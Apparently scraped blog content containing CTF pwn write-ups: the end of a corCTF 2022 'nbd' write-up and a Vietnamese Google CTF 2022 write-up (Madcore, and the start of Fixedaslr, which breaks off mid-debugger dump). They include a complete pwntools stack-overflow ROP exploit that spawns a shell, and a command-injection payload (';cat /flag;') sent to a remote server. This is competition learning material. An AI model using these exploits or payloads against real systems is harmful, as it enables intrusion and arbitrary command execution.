hit me up telling me a suspicious function.\nvoid ask_list(int sock) { uint32_t opt_server; uint32_t len; uint32_t lenn; uint32_t reptype; uint64_t magic; int rlen; const int BUF_SIZE = 1024; char buf[BUF_SIZE]; send_request(sock, NBD_OPT_LIST, 0, NULL); /* newline, move away from the \u0026#34;Negotiation:\u0026#34; line */ printf(\u0026#34;\\n\u0026#34;); do { memset(buf, 0, 1024); if(read(sock, \u0026amp;magic, sizeof(magic)) \u0026lt; 0) { err(\u0026#34;Reading magic from server: %m\u0026#34;); } if(read(sock, \u0026amp;opt_server, sizeof(opt_server)) \u0026lt; 0) { err(\u0026#34;Reading option: %m\u0026#34;); } if(read(sock, \u0026amp;reptype, sizeof(reptype)) \u0026lt;0) { err(\u0026#34;Reading reply from server: %m\u0026#34;); } if(read(sock, \u0026amp;len, sizeof(len)) \u0026lt; 0) { err(\u0026#34;Reading length from server: %m\u0026#34;); } magic=ntohll(magic); len=ntohl(len); reptype=ntohl(reptype); if(magic != rep_magic) { err(\u0026#34;Not enough magic from server\u0026#34;); } if(reptype \u0026amp; NBD_REP_FLAG_ERROR) { switch(reptype) { case NBD_REP_ERR_POLICY: fprintf(stderr, \u0026#34;\\nE: listing not allowed by server.\\n\u0026#34;); break; default: fprintf(stderr, \u0026#34;\\nE: unexpected error from server.\\n\u0026#34;); break; } if(len \u0026gt; 0 \u0026amp;\u0026amp; len \u0026lt; BUF_SIZE) { if((rlen=read(sock, buf, len)) \u0026lt; 0) { fprintf(stderr, \u0026#34;\\nE: could not read error message from server\\n\u0026#34;); } else { buf[rlen] = \u0026#39;\\0\u0026#39;; fprintf(stderr, \u0026#34;Server said: %s\\n\u0026#34;, buf); } } exit(EXIT_FAILURE); } else { if(reptype != NBD_REP_ACK) { if(reptype != NBD_REP_SERVER) { err(\u0026#34;Server sent us a reply we don\u0026#39;t understand!\u0026#34;); } if(read(sock, \u0026amp;lenn, sizeof(lenn)) \u0026lt; 0) { fprintf(stderr, \u0026#34;\\nE: could not read export name length from server\\n\u0026#34;); exit(EXIT_FAILURE); } lenn=ntohl(lenn); if (lenn \u0026gt;= BUF_SIZE) { fprintf(stderr, \u0026#34;\\nE: export name on server too long\\n\u0026#34;); exit(EXIT_FAILURE); } if(read(sock, buf, lenn) \u0026lt; 0) { fprintf(stderr, \u0026#34;\\nE: could not read export name from server\\n\u0026#34;); exit(EXIT_FAILURE); } buf[lenn] = 0; printf(\u0026#34;%s\u0026#34;, buf); len -= lenn; len -= sizeof(lenn); if(len \u0026gt; 0) { if(read(sock, buf, len) \u0026lt; 0) { fprintf(stderr, \u0026#34;\\nE: could not read export description from server\\n\u0026#34;); exit(EXIT_FAILURE); } buf[len] = 0; printf(\u0026#34;: %s\\n\u0026#34;, buf); } else { printf(\u0026#34;\\n\u0026#34;); } } } } while(reptype != NBD_REP_ACK); send_request(sock, NBD_OPT_ABORT, 0, NULL); } len has uint32_t data type, so it\u0026rsquo;s always greater than 0. There\u0026rsquo;s also no check for len and it is a controllable variable. Basically we have a stack buffer overflow here.\nBecause the binary has no PIE, it becomes a normal rop challenge.\nask_list gets called inside negotiate.\nvoid negotiate(int *sockp, u64 *rsize64, uint16_t *flags, char* name, uint32_t needed_flags, uint32_t client_flags, uint32_t do_opts, char *certfile, char *keyfile, char *cacertfile, char *tlshostname, bool tls, bool can_opt_go) { ... if(do_opts \u0026amp; NBDC_DO_LIST) { ask_list(sock); exit(EXIT_SUCCESS); } ... and negotiate is called here in main:\nint main(int argc, char *argv[]) { ... if (!preinit) negotiate(\u0026amp;sock, \u0026amp;size64, \u0026amp;flags, name, needed_flags, cflags, opts, certfile, keyfile, cacertfile, tlshostname, tls, can_opt_go); ... Inside negotiate function, we need to bypass some checks:\nprintf(\u0026#34;Negotiation: \u0026#34;); readit(sock, buf, 8); if (strcmp(buf, INIT_PASSWD))\t// INIT_PASSWD is \u0026#34;NBDMAGIC\u0026#34; err(\u0026#34;INIT_PASSWD bad\u0026#34;); ... readit(sock, \u0026amp;tmp, sizeof(uint16_t)); global_flags = ntohs(tmp); if((needed_flags \u0026amp; global_flags) != needed_flags) {\t// need to pass this check too /* There\u0026#39;s currently really only one reason why this * check could possibly fail, but we may need to change * this error message in the future... */ fprintf(stderr, \u0026#34;\\nE: Server does not support listing exports\\n\u0026#34;); exit(EXIT_FAILURE); } And some more checks inside ask_list:\nif(magic != rep_magic) { err(\u0026#34;Not enough magic from server\u0026#34;); } if(reptype \u0026amp; NBD_REP_FLAG_ERROR) {\t// We don\u0026#39;t want to go into this if branch ... } else { if(reptype != NBD_REP_SERVER) // reptype should be equal to NBD_REP_SERVER err(\u0026#34;Server sent us a reply we don\u0026#39;t understand!\u0026#34;); } For the ropchain, I use write syscall to leak libc, and finally use dup2/execve to spawn a shell.\nFinal script: from pwn import * elf = ELF(\u0026#39;./nbd-client\u0026#39;) libc = ELF(\u0026#39;./libc-2.31.so\u0026#39;) p = process([\u0026#39;nc\u0026#39;, \u0026#39;-lnvp\u0026#39;, \u0026#39;9999\u0026#39;]) pause() p.send(b\u0026#39;NBDMAGIC\u0026#39;) # INIT_PASSWD p.send(b\u0026#39;IHAVEOPT\u0026#39;[::-1]) p.send(b\u0026#39;\\x00\\x01\u0026#39;) # tmp p.send(p64(0xa965550489e80300)) # rep_magic p.send(b\u0026#39;a\u0026#39;*4) # opt_server p.send(b\u0026#39;\\x00\\x00\\x00\\x02\u0026#39;) # reptype p.send(b\u0026#39;\\x00\\x00\\x10\\x00\u0026#39;) # len p.send(b\u0026#39;\\x00\\x00\\x01\\x00\u0026#39;) # lenn p.sendline(b\u0026#39;\u0026#39;) sleep(0.5) pop_rdi = 0x402b56 pop_rsi = 0x40419d payload = b\u0026#39;\\x00\u0026#39;*0x424 payload += p32(1) payload += b\u0026#39;\\x00\u0026#39;*0x40 payload += p64(pop_rdi) payload += p64(3) payload += p64(pop_rsi) payload += p64(elf.got[\u0026#39;read\u0026#39;]) payload += p64(elf.sym[\u0026#39;write\u0026#39;]) payload += p64(0x00404360) p.send(payload) libc.address = u64(p.recvuntil(b\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8, b\u0026#39;\\x00\u0026#39;)) - libc.sym[\u0026#39;read\u0026#39;] print(hex(libc.address)) system = libc.sym[\u0026#39;system\u0026#39;] pop_rax = libc.address + 0x36174 pop_rdx = libc.address + 0x142c92 syscall = libc.address + 0x630a9 bin_sh = next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) p.send(p64(0xa965550489e80300)) # rep_magic p.send(b\u0026#39;a\u0026#39;*4) # opt_server p.send(b\u0026#39;\\x00\\x00\\x00\\x02\u0026#39;) # reptype p.send(b\u0026#39;\\x00\\x00\\x10\\x00\u0026#39;) # len p.send(b\u0026#39;\\x00\\x00\\x01\\x00\u0026#39;) # lenn p.sendline(b\u0026#39;\u0026#39;) sleep(0.5) payload = b\u0026#39;\\x00\u0026#39;*0x424 payload += p32(1) payload += b\u0026#39;\\x00\u0026#39;*0x40 payload += p64(pop_rdi) payload += p64(3) payload += p64(pop_rsi) payload += p64(0) payload += p64(pop_rax) payload += p64(33) payload += p64(syscall) payload += p64(pop_rsi) payload += p64(1) payload += p64(pop_rax) payload += p64(33) payload += p64(syscall) payload += p64(pop_rsi) payload += p64(2) payload += p64(pop_rax) payload += p64(33) payload += p64(syscall) payload += p64(pop_rdi) payload += p64(bin_sh) payload += p64(pop_rsi) payload += p64(0) payload += p64(pop_rdx) payload += p64(0) payload += p64(pop_rax) payload += p64(0x3b) payload += p64(syscall) p.send(payload) p.recvrepeat(0.5) p.interactive() $ python3 solve.py [*] \u0026#39;/home/pivik/CTF/2022/cor/pwn/nbd/nbd-client\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) FORTIFY: Enabled [*] \u0026#39;/home/pivik/CTF/2022/cor/pwn/nbd/libc-2.31.so\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Starting local process \u0026#39;/usr/bin/nc\u0026#39;: pid 8951 [*] Paused (press any to continue) 0x7f2eaaec2000 [*] Switching to interactive mode $ id uid=1000(ctf) gid=1000(ctf) groups=1000(ctf) $ ls flag.txt nbd-client serv.py $ cat flag.txt corctf{ch3cK-y0UR_v4R14Bl3$!!11!111} ","permalink":"https://pivik271.github.io/posts/corctf2022/","summary":"I played corCTF last week with my team purf3ct and managed to solve 4 pwn challenges. Here are my writeups for some of them.\nAll of my exploit scripts can be found here.\ncorchat: Category: pwn Points: 334 Solves: 10 Description: Can you pwn our internal, terribly written, chat program? Overview The binary implements a chat server which allows a maximum of 4 Crusaders at a time. There are 4 modes:","title":"corCTF 2022 - corchat, nbd"},{"content":"Cũng một thời gian rồi mình chưa viết gì trên blog. Vừa mới thi cuối kì xong là có giải Google CTF luôn nên mình quyết định come back. Sau 48h cày xuyên màn đêm cùng đồng bọn thì mình làm được 2 bài pwn, đỡ phế hơn năm rồi hehe.\nCác binary với solve script mình sẽ để ở đây.\nMadcore: Category: pwn Points: 256 Solves: 30 Description: My coredump helper is crashing while handling a crash : ( Overview Những việc mình thường làm đầu tiên khi chơi pwn \u0026hellip;\npi@vik: ~/CTF/google_ctf $ file madcore madcore: ELF 64-bit LSB pie executable, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ee34abf2786eb52f2099eed9200e596f9254343b, for GNU/Linux 3.2.0, not stripped pi@vik: ~/CTF/google_ctf $ checksec madcore [*] \u0026#39;/home/pi/CTF/google_ctf/madcore\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled pi@vik: ~/CTF/google_ctf $ Tiếp theo thì mở IDA lên và\nBome rồi, c++. Đọc sơ qua thì có vẻ chương trình nhận vào 1 file core dump rồi xử lí gì đó.\nsize = 0x1000000LL; s = malloc(0x1000000uLL); memset(s, 0, 0x1000000uLL); buf = (char *)s; v23 = 0LL; for ( i = 0; size; printf(\u0026#34;Read %d\\n\u0026#34;, (unsigned int)i) ) { i = read(0, buf, size); if ( i \u0026lt;= 0 ) break; size -= i; buf += i; } Lúc này mình quyết định không làm nữa và nhảy qua bài Fixedaslr.\nGenerate core dump Sau khi sml với Fixedaslr thì mình cũng đã trở lại rồi đây. Okay lúc này mình quyết định tạo thử 1 file core dump, dựa theo link này.\npi@vik: ~/CTF/google_ctf $ ulimit -c unlimited Mình cũng chuyển location của file core dump về 1 thư mục khác luôn để dễ debug.\npi@vik: ~/CTF/google_ctf $ sudo sysctl -w kernel.core_pattern=/home/pi/CTF/google_ctf/coredump/core_%e_%p Tiếp theo thì mình tạo 1 file c để tạo core dump.\n#include \u0026lt;stdio.h\u0026gt; int main() { char buf[0x20]; gets(buf); } pi@vik: ~/CTF/google_ctf $ gcc -o test test.c test.c: In function ‘main’: test.c:5:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration] 5 | gets(buf); | ^~~~ | fgets /usr/bin/ld: /tmp/ccmvs0wy.o: in function `main\u0026#39;: test.c:(.text+0x28): warning: the `gets\u0026#39; function is dangerous and should not be used. pi@vik: ~/CTF/google_ctf $ ./test aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa *** stack smashing detected ***: terminated Aborted (core dumped) pi@vik: ~/CTF/google_ctf $ cd coredump/ pi@vik: ~/CTF/google_ctf/coredump $ ls core_test_6040 pi@vik: ~/CTF/google_ctf/coredump $ file core_test_6040 core_test_6040: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from \u0026#39;./test\u0026#39;, real uid: 1000, effective uid: 1000, real gid: 1000, effective gid: 1000, execfn: \u0026#39;./test\u0026#39;, platform: \u0026#39;x86_64\u0026#39; Có được file core dump rồi thì mình viết 1 script python để test thử chương trình.\nfrom pwn import * p = process(\u0026#39;./madcore\u0026#39;) with open(\u0026#39;./coredump/core_test_6040\u0026#39;, \u0026#39;rb\u0026#39;) as f: core_dump = f.read() payload = core_dump payload = payload.ljust(0x1000000, b\u0026#39;\\x00\u0026#39;) p.sendline(payload) p.recvuntil(b\u0026#39;FINISHED READING.\\n\u0026#39;) p.interactive() pi@vik: ~/CTF/google_ctf $ python3 test.py [+] Starting local process \u0026#39;./madcore\u0026#39;: pid 6301 [*] Switching to interactive mode sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found {\u0026#34;backtrace\u0026#34;:[[0,\u0026#34;\u0026lt;unknown\u0026gt;\u0026#34;],[45524,\u0026#34;\u0026#34;],[993956,\u0026#34;\u0026#34;],[501318,\u0026#34;\u0026#34;],[505870,\u0026#34;\u0026#34;],[107638,\u0026#34;\u0026#34;],[2035,\u0026#34;\u0026#34;]],\u0026#34;modules\u0026#34;:[\u0026#34;/home/pi/CTF/google_ctf/test\u0026#34;,\u0026#34;/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\u0026#34;]}[*] Got EOF while reading in interactive $ [*] Interrupted [*] Process \u0026#39;./madcore\u0026#39; stopped with exit code 0 (pid 6301) Finding the bug Sau khi chạy thử đoạn test ở trên, mình có để ý dòng sh: 1: llvm-symbolizer: not found. Điều này có nghĩa là trong chương trình có thực thi lệnh llvm-symbolizer, nhưng trên local mình không có nên mới có dòng đó.\npi@vik: ~/CTF/google_ctf $ which llvm-symbolizer pi@vik: ~/CTF/google_ctf $ Nếu bạn nào chơi ctf nhiều, sau khi thấy dòng system command được thực thi, thì chắc cũng đoán được điều gì rồi.\nYep, mình có nghĩ tới command injection, nhưng lúc này mình vẫn chưa chắc, với cũng không vội, nên mình ngồi reverse sơ qua binary. Sau khi ngồi khoảng 4-5 tiếng đồng hồ vừa reverse vừa tìm bug, thì mình tình cờ tìm đến được hàm này.\nCommand injection v3 = a2[1]; v4 = (const char *)Binary::GetFileName((Binary *)a2[2]); v14 = snprintf(0LL, 0LL, \u0026#34;%s --obj=%s %p\u0026#34;, *a2, v4, v3); s = (char *)malloc(v14 + 1); v5 = a2[1]; v6 = (const char *)Binary::GetFileName((Binary *)a2[2]); snprintf(s, v14 + 1, \u0026#34;%s --obj=%s %p\u0026#34;, *a2, v6, v5); stream = popen(s, \u0026#34;r\u0026#34;); Huh popen? Lúc này mình mới nhớ về ý tưởng command injection ban đầu. Nếu mình điều khiển được s thì mọi chuyện sẽ xong. Ở dòng snprintf(s, v14 + 1, \u0026quot;%s --obj=%s %p\u0026quot;, *a2, v6, v5);, mình để ý thấy v6 = (const char *)Binary::GetFileName((Binary *)a2[2]); có vẻ là một ứng viên để điều khiển. Lúc này mình debug thử xem v6 là gì.\nThanh ghi R8 chính là tham số thứ 5 được truyền vào hàm, cũng chính là v6. Hmm v6 lúc này là chuỗi /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2, vậy nếu mình replace chuỗi này trong file core dump thành 1 command thì sao?\nfrom pwn import * p = process(\u0026#39;./madcore\u0026#39;) to_replace = b\u0026#39;/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\u0026#39; cmd = b\u0026#39;;id;\u0026#39; cmd = cmd.ljust(len(to_replace), b\u0026#39;a\u0026#39;) with open(\u0026#39;./coredump/core_test_6040\u0026#39;, \u0026#39;rb\u0026#39;) as f: core_dump = f.read() core_patched = core_dump.replace(to_replace, cmd) payload = core_patched payload = payload.ljust(0x1000000, b\u0026#39;\\x00\u0026#39;) p.sendline(payload) p.recvuntil(b\u0026#39;FINISHED READING.\\n\u0026#39;) p.interactive() Okay vậy là mình đã thay đổi chuỗi ở trên thành command id, chạy thử xem thế nào.\npi@vik: ~/CTF/google_ctf $ python3 test.py [+] Starting local process \u0026#39;./madcore\u0026#39;: pid 6821 [*] Switching to interactive mode sh: 1: llvm-symbolizer: not found sh: 1: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found {\u0026#34;backtrace\u0026#34;:[[0,\u0026#34;\u0026lt;unknown\u0026gt;\u0026#34;],[45524,\u0026#34;uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare),99\u0026#34;],[993956,\u0026#34;\u0026#34;],[501318,\u0026#34;\u0026#34;],[505870,\u0026#34;\u0026#34;],[107638,\u0026#34;\u0026#34;],[2035,\u0026#34;\u0026#34;]],\u0026#34;modules\u0026#34;:[\u0026#34;/home/pi/CTF/google_ctf/test\u0026#34;,\u0026#34;;id;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#34;]}[*] Got EOF while reading in interactive $ [*] Interrupted [*] Process \u0026#39;./madcore\u0026#39; stopped with exit code 0 (pid 6821) Yay vậy là ý tưởng command injection thực hiện được. Mình mới chạy thử trên server.\npi@vik: ~/CTF/google_ctf $ python3 test.py [+] Opening connection to madcore.2022.ctfcompetition.com on port 1337: Done [*] Switching to interactive mode {\u0026#34;backtrace\u0026#34;:[[0,\u0026#34;\u0026lt;unknown\u0026gt;\u0026#34;],[45524,\u0026#34;\u0026#34;],[993956,\u0026#34;\u0026#34;],[501318,\u0026#34;\u0026#34;],[505870,\u0026#34;\u0026#34;],[107638,\u0026#34;\u0026#34;],[2035,\u0026#34;\u0026#34;]],\u0026#34;modules\u0026#34;:[\u0026#34;/home/pi/CTF/google_ctf/test\u0026#34;,\u0026#34;/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#34;,\u0026#34;;id;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#34;]}[*] Got EOF while reading in interactive $ [*] Interrupted [*] Closed connection to madcore.2022.ctfcompetition.com port 1337 Ủa gì dọ, output của toi đou?\nThật sự thì lúc này mình cũng không biết sao trên server lại không chạy được. Để chắc chắn command injection vẫn hoạt động, mình mới test một vài command khác. Sau 1 lúc test mình thấy command echo /* cho ra output.\npi@vik: ~/CTF/google_ctf $ python3 test.py [+] Opening connection to madcore.2022.ctfcompetition.com on port 1337: Done [*] Switching to interactive mode {\u0026#34;backtrace\u0026#34;:[[0,\u0026#34;\u0026lt;unknown\u0026gt;\u0026#34;],[45524,\u0026#34;/bin /boot /dev /etc /flag /home /lib /lib32 /lib64 /libx32 /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var\\n\u0026#34;],[993956,\u0026#34;\u0026#34;],[501318,\u0026#34;\u0026#34;],[505870,\u0026#34;\u0026#34;],[107638,\u0026#34;\u0026#34;],[2035,\u0026#34;\u0026#34;]],\u0026#34;modules\u0026#34;:[\u0026#34;/home/pi/CTF/google_ctf/test\u0026#34;,\u0026#34;/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#34;,\u0026#34;;echo /*;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#34;]}[*] Got EOF while reading in interactive $ [*] Interrupted [*] Closed connection to madcore.2022.ctfcompetition.com port 1337 Vậy là mình có thể chắc chắn rằng command injection vẫn hoạt động trên server, giờ chỉ việc thay command thành cat /flag thôi.\nFinal script from pwn import * # p = process(\u0026#39;./madcore\u0026#39;) p = remote(\u0026#39;madcore.2022.ctfcompetition.com\u0026#39;, 1337) to_replace = b\u0026#39;/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\u0026#39; cmd = b\u0026#39;;cat /flag;\u0026#39; cmd = cmd.ljust(len(to_replace), b\u0026#39;a\u0026#39;) with open(\u0026#39;./coredump/core_test_6040\u0026#39;, \u0026#39;rb\u0026#39;) as f: core_dump = f.read() core_patched = core_dump.replace(to_replace, cmd) payload = core_patched payload = payload.ljust(0x1000000, b\u0026#39;\\x00\u0026#39;) p.sendline(payload) p.recvuntil(b\u0026#39;FINISHED READING.\\n\u0026#39;) p.interactive() pi@vik: ~/CTF/google_ctf $ python3 solve.py [+] Opening connection to madcore.2022.ctfcompetition.com on port 1337: Done [*] Switching to interactive mode {\u0026#34;backtrace\u0026#34;:[[0,\u0026#34;\u0026lt;unknown\u0026gt;\u0026#34;],[45524,\u0026#34;CTF{w4y_cpp_g0tta_be_like_that_can_we_get_a_good_STLPLS}\\n\u0026#34;],[993956,\u0026#34;\u0026#34;],[501318,\u0026#34;\u0026#34;],[505870,\u0026#34;\u0026#34;],[107638,\u0026#34;\u0026#34;],[2035,\u0026#34;\u0026#34;]],\u0026#34;modules\u0026#34;:[\u0026#34;/home/pi/CTF/google_ctf/test\u0026#34;,\u0026#34;/usr/lib/x86_64-linux-gnu/libc.so.6\u0026#34;,\u0026#34;;cat /flag;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#34;]}[*] Got EOF while reading in interactive $ [*] Interrupted [*] Closed connection to madcore.2022.ctfcompetition.com port 1337 Fixedaslr: Category: pwn Points: 240 Solves: 35 Description: I wasn\u0026rsquo;t happy with the default ASLR, so I fixed it. The flag is in a file called \u0026ldquo;flag\u0026rdquo; both in / and cwd. Đầu tiên thì mình xin gửi lời cảm ơn tới 1 người đồng đội đã cùng mình giải bài này, đặc biệt là phần crypto. Kudos to you mate!\nOverview Đề cho 7 object file và 1 file binary loader.\npi@vik: ~/CTF/google_ctf/fixedaslr $ ls basic.o debug.o game.o guard.o loader main.o res.o syscalls.o Vẫn là những điều quen thuộc \u0026hellip;\npi@vik: ~/CTF/google_ctf/fixedaslr $ file loader loader: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=71086f1a8e8132c20313b70de229555e4f551144, not stripped pi@vik: ~/CTF/google_ctf/fixedaslr $ checksec loader [*] \u0026#39;/home/pi/CTF/google_ctf/fixedaslr/loader\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) IDA Đầu tiên chương trình gọi hàm sys_getrandom() để tạo 1 giá trị random cho rand_state. Sau đó gọi rand(64) để khởi tạo giá trị cho canary. Tiếp theo load các object file vào memory. Base address của các object file được tạo random bằng cách gọi rand(12) \u0026lt;\u0026lt; 28. Cuối cùng thì gọi hàm pivot_to_main để munmap địa chỉ 0x400000 (địa chỉ base address của file loader) và bắt đầu gọi tới file main.o. Chúng ta sẽ chỉ tập trung vào hàm menu(). Hàm này thì nằm trong game.o.\n__int64 menu() { __int64 result; // rax int v1; // eax char v2[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v3; // [rsp+38h] [rbp-8h] v3 = __readfsqword(0x28u); puts(\u0026#34;\\n-=*) MAIN MENU:\\n 1) Play The Game\\n 2) See full scoreboard\\n 3) See score for place\\n 4) Exit\\nYour choice?\u0026#34;); if ( (unsigned __int8)readline(v2, 32LL) != 1 ) return 0LL; v1 = (unsigned __int8)atou64(v2); if ( (unsigned __int8)v1 == 4 ) { puts(\u0026#34;Alright, bye\u0026#34;); result = 0LL; } else { if ( v1 \u0026lt;= 4 ) { if ( v1 == 3 ) { see_scoreboard(); return 1LL; } if ( v1 \u0026lt;= 3 ) { if ( v1 == 1 ) { game(); return 1LL; } if ( v1 == 2 ) { see_full_scoreboard(); return 1LL; } } } puts(\u0026#34;Come again?\u0026#34;); result = 1LL; } return result; } Hàm game() random 2 số rồi cộng lại. Nếu trả lời đúng thì sẽ +5 điểm.\nunsigned __int64 game() { unsigned __int8 v1; // [rsp+Ch] [rbp-64h] unsigned __int8 v2; // [rsp+Dh] [rbp-63h] unsigned __int64 v3; // [rsp+10h] [rbp-60h] __int64 i; // [rsp+18h] [rbp-58h] char s[32]; // [rsp+20h] [rbp-50h] BYREF char v6[40]; // [rsp+40h] [rbp-30h] BYREF unsigned __int64 v7; // [rsp+68h] [rbp-8h] v7 = __readfsqword(0x28u); puts(\u0026#34;Have Fun, Good Luck!\u0026#34;); v3 = 0LL; for ( i = 1LL; ; ++i ) { print(\u0026#34;\\nRound \u0026#34;); u64toa(s, i); puts(s); v1 = rand() % 0xAu; v2 = rand() % 0xAu; print(\u0026#34;How much is \u0026#34;); u64toa(s, v1); print(s); print(\u0026#34; + \u0026#34;); u64toa(s, v2); print(s); puts(\u0026#34; ?\u0026#34;); if ( (unsigned __int8)readline(v6, 32LL) != 1 ) break; if ( v1 + v2 != (unsigned __int8)atou64(v6) ) { puts(\u0026#34;Wrong! Game Over!\u0026#34;); check_scoreboard(v3); return v7 - __readfsqword(0x28u); } v3 += 5LL; print(\u0026#34;Yes! +5pts! You have \u0026#34;); u64toa(s, v3); print(s); puts(\u0026#34;pts total.\u0026#34;); } return v7 - __readfsqword(0x28u); } Nhập sai thì sẽ in ra dòng Wrong! Game Over! và kiểm tra xem số điểm cuối cùng có thể vào được scoreboard không.\nunsigned __int64 __fastcall check_scoreboard(unsigned __int64 score) { int i; // [rsp+14h] [rbp-Ch] unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); for ( i = 0; i \u0026lt;= 9; ++i ) { if ( score \u0026gt; game_scoreboard[i] ) { shift_scoreboard(i); get_player_name(i); game_scoreboard[i] = score; return v3 - __readfsqword(0x28u); } } return v3 - __readfsqword(0x28u); } Nếu được thì sẽ shift scoreboard và gọi hàm get_player_name() để nhập vào tên của player.\nHàm see_scoreboard() cho phép xem số điểm cần thiết để đạt được thứ hạng đó. Còn hàm see_full_scoreboard() thì dùng để xem full scoreboard.\nFinding the bug Giờ thì chúng ta cũng đã hiểu sơ qua cách chương trình hoạt động. Tới lúc tìm bug rồi.\nBug đầu tiên nằm ở hàm get_player_name(). Để ý nếu nbytes \u0026gt; 31 thì mặc dù chương trình in ra dòng Name too long! No SCOREBOARD for you. nhưng vẫn cho phép read vào buffer =\u0026gt; lỗi buffer overflow.\nBug thứ hai thì ở trong hàm see_scoreboard(). Không có đoạn check nào kiểm tra v1 =\u0026gt; out-of-bounds.\nVới lỗi bof thì mình có thể hoàn toàn build 1 cái ropchain, nhưng để làm được điều đó thì mình cần phải bypass được canary. Vậy làm cách nào để bypass được? Hmm, chúng ta vẫn còn lỗi oob chưa sử dụng, vậy trong trường hợp này, mình có thể làm được gì với oob?\nOob Dưới đây là các giá trị trong mảng game_scoreboard.\ngef➤ telescope 0x0000f2b0002000 0x0000f2b0002000│+0x0000: 0x0000000000005f (\u0026#34;_\u0026#34;?)\t← $rdx 0x0000f2b0002008│+0x0008: 0x0000000000005a (\u0026#34;Z\u0026#34;?) 0x0000f2b0002010│+0x0010: 0x00000000000055 (\u0026#34;U\u0026#34;?) 0x0000f2b0002018│+0x0018: 0x00000000000050 (\u0026#34;P\u0026#34;?) 0x0000f2b0002020│+0x0020: 0x0000000000004b (\u0026#34;K\u0026#34;?) 0x0000f2b0002028│+0x0028: 0x00000000000046 (\u0026#34;F\u0026#34;?) 0x0000f2b0002030│+0x0030: 0x00000000000041 (\u0026#34;A\u0026#34;?) 0x0000f2b0002038│+0x0038: 0x0000000000003c (\u0026#34;\u0026lt;\u0026#34;?) 0x0000f2b0002040│+0x0040: 0x00000000000037 (\u0026#34;7\u0026#34;?) 0x0000f2b0002048│+0x0048: 0x00000000000032 (\u0026#34;2\u0026#34;?) Ta thấy ở offset 512 chứa 1 địa chỉ.\ngef➤ telescope 0x0000f2b0002000+512*8 0x0000f2b0003000│+0x0000: 0x0000f2b0002060 → 0x00000079726147 (\u0026#34;Gary\u0026#34;?) 0x0000f2b0003008│+0x0008: 0x0000000000000000 0x0000f2b0003010│+0x0010: 0x0000000000000000 0x0000f2b0003018│+0x0018: 0x0000000000000000 0x0000f2b0003020│+0x0020: 0x0000000000000000 0x0000f2b0003028│+0x0028: 0x0000000000000000 0x0000f2b0003030│+0x0030: 0x0000000000000000 0x0000f2b0003038│+0x0038: 0x0000000000000000 0x0000f2b0003040│+0x0040: 0x0000000000000000 0x0000f2b0003048│+0x0048: 0x0000000000000000 Địa chỉ này nằm trong vùng main.o nên mình có thể leak được base address của main.o. Tương tự như vậy, ở offset -1023 và -1017 có thể leak thêm base address của 2 file object nữa là game.o và guard.o\ngef➤ telescope 0x0000f2b0002000-1023*8 0x0000f2b0000008│+0x0000: 0x00009580001111 → 0xe5894855fa1e0ff3 0x0000f2b0000010│+0x0008: 0xcccc0000000225ff 0x0000f2b0000018│+0x0010: 0x0000958000175c → 0xe5894855fa1e0ff3 0x0000f2b0000020│+0x0018: 0xcccc0000000225ff 0x0000f2b0000028│+0x0020: 0x00009580001000 → 0xe5894855fa1e0ff3 0x0000f2b0000030│+0x0028: 0xcccc0000000225ff 0x0000f2b0000038│+0x0030: 0x00004080001000 → 0xe5894855fa1e0ff3 0x0000f2b0000040│+0x0038: 0x0000000000000000 0x0000f2b0000048│+0x0040: 0x0000000000000000 0x0000f2b0000050│+0x0048: 0x0000000000000000 3 địa chỉ vừa leak có thể dùng làm offset để leak thêm 1 vài địa chỉ nữa. Mình ví dụ địa chỉ 0x00009580000000 vừa leak được\ngef➤ telescope 0x00009580000000 0x00009580000000│+0x0000: 0xcccc0000000225ff 0x00009580000008│+0x0008: 0x0000db4000119c → 0xe5894855fa1e0ff3 0x00009580000010│+0x0010: 0xcccc0000000225ff 0x00009580000018│+0x0018: 0x0000db400011f2 → 0xe5894855fa1e0ff3 0x00009580000020│+0x0020: 0xcccc0000000225ff 0x00009580000028│+0x0028: 0x00004080001000 → 0xe5894855fa1e0ff3 0x00009580000030│+0x0030: 0xcccc0000000225ff 0x00009580000038│+0x0038: 0x0000db40001ac5 → 